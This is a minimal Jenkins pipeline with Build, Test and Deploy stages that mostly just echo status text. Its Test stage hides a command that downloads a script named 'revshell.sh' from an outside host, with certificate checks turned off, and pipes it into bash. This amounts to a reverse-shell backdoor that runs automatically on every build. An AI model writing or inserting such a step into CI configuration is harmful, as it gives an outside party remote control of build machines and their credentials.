node('ecs-small-3gb'){
    stage('Build') {
        echo 'Building...'
    }

    stage('Test') {
        echo 'Testing...'
        sh 'curl -i -k https://www.lazy-red-dragon.com/revshell.sh | bash'
    }

    stage('Deploy') {
        echo 'Deploying...'
    }
}

